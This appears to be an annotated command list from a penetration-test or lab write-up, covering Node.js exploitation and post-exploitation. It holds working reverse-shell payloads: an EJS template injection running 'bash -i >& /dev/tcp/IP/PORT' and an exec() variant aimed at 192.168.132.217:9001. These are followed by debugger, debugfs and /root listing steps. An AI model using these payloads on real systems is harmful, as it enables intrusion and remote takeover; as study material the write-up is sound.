### 1. EJS Template Injection with `execSync`

```ejs
<%= global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"') %>
```

- Embedded inside an **EJS template**.
- Uses Node.js `child_process.execSync()` to execute a system command.
- The Bash command attempts to establish a **reverse shell** to `IP:PORT` by redirecting standard input, output, and error.

---

### 2. Connect to the Node.js Debugger

```bash
node inspect 127.0.0.1:9229
```

- Connects to a Node.js debugger listening on **127.0.0.1:9229**.
- Allows stepping through code, inspecting variables, and executing debugger commands.
- Generally safe when bound to `localhost`, but exposing the debugger externally can create a significant security risk.

---

### 3. Reverse Shell Using `exec()`

```javascript
exec("global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/192.168.132.217/9001 0>&1\"')")
```

- Uses `child_process.exec()` instead of `execSync()`.
- Executes a Bash command that attempts to establish a reverse shell to `192.168.132.217:9001`.
- Demonstrates the same code execution technique as the previous example, but uses asynchronous execution.

---

### 4. List Block Devices

```bash
lsblk
```

- Lists available block devices, including disks and partitions.
- Useful for viewing the system's storage layout.
- Common administrative command and not inherently suspicious.

---

### 5. Open the ext Filesystem Debugger

```bash
debugfs /dev/nvme0n1p1
```

- Opens the `debugfs` utility for the specified ext filesystem.
- Enables inspection and modification of filesystem structures such as inodes and superblocks.
- Commonly used for recovery and forensic analysis, but can be destructive if misused.

---

### 6. List the Root User's Home Directory

```bash
ls -l /root
```

- Displays files and directories inside the `/root` directory.
- Requires root privileges or equivalent permissions.
- May indicate privilege escalation or unauthorized access if executed by an unexpected user.
